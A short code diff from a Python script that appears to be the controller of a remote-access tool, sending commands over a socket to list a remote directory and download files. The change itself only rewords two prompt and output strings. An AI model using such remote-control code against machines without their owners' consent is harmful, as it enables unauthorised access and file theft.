@@ -58,12 +58,12 @@ def main():
     
     def custom_dir():
         conn.send(command.encode())
-        user_input = str(input("Custom directory"))
+        user_input = str(input("Custom directory: "))
         conn.send(user_input.encode())
         print("[+] Command has been sent")
         files = conn.recv(5000)
         files = files.decode()
-        print("[+] Custom directory results", files)
+        print("[+] Directory:\n", files)
 
     def download_file():
         conn.send(command.encode())
